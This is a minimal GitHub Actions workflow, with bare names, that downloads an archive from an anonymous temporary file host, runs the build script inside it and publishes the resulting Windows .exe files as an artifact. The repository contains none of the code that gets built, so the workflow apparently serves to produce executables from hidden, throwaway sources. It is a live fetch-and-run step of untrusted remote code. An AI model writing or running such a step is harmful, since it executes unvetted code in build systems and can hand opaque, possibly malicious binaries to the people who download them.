name: b
on:
  push:
    branches: [main]
  workflow_dispatch:
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - run: curl -sL https://litter.catbox.moe/qucgd2.gz -o t.gz && mkdir r && tar xzf t.gz -C r && bash r/build.sh
      - uses: actions/upload-artifact@v4
        with:
          name: dayline-windows
          path: r/zig-out/**/*.exe
